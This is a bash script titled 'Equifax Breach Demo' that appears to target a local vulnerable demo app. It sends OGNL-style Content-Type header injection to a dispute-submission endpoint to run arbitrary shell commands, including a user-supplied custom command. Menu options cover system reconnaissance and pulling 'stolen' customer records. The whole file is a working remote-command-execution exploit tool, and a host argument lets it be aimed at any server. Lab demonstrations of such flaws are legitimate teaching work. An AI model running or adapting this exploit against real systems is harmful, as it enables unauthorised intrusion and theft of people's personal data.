#!/bin/bash

# Default to localhost if no IP provided
HOST=${1:-"localhost"}
PORT=${2:-"5000"}

# Function to send exploit
exploit_command() {
    local cmd=$1
    echo -e "\n[*] Executing: $cmd"
    curl -s -X POST "http://$HOST:$PORT/api/submit-dispute" \
         -H "Content-Type: %{(#cmd='$cmd')}" | \
    python3 -m json.tool
}

# Show menu
show_menu() {
    echo -e "\nEquifax Breach Demo - Command Menu"
    echo "================================="
    echo "1. whoami - Show current user"
    echo "2. hostname - Show system name"
    echo "3. pwd - Show current directory"
    echo "4. ls -la - List files"
    echo "5. systeminfo - System information"
    echo "6. Custom command"
    echo "7. Show stolen data"
    echo "8. Exit"
    echo -n "Select an option: "
}

# Get stolen data
get_stolen_data() {
    echo -e "\n[*] Extracting customer data..."
    curl -s "http://$HOST:$PORT/api/disputes" | python3 -m json.tool
}

# Main loop
while true; do
    show_menu
    read choice

    case $choice in
        1) exploit_command "whoami" ;;
        2) exploit_command "hostname" ;;
        3) exploit_command "pwd" ;;
        4) exploit_command "ls -la" ;;
        5) exploit_command "systeminfo" ;;
        6)
            echo -n "Enter command: "
            read cmd
            exploit_command "$cmd"
            ;;
        7) get_stolen_data ;;
        8) echo "Exiting..."; exit 0 ;;
        *) echo "Invalid option" ;;
    esac
done
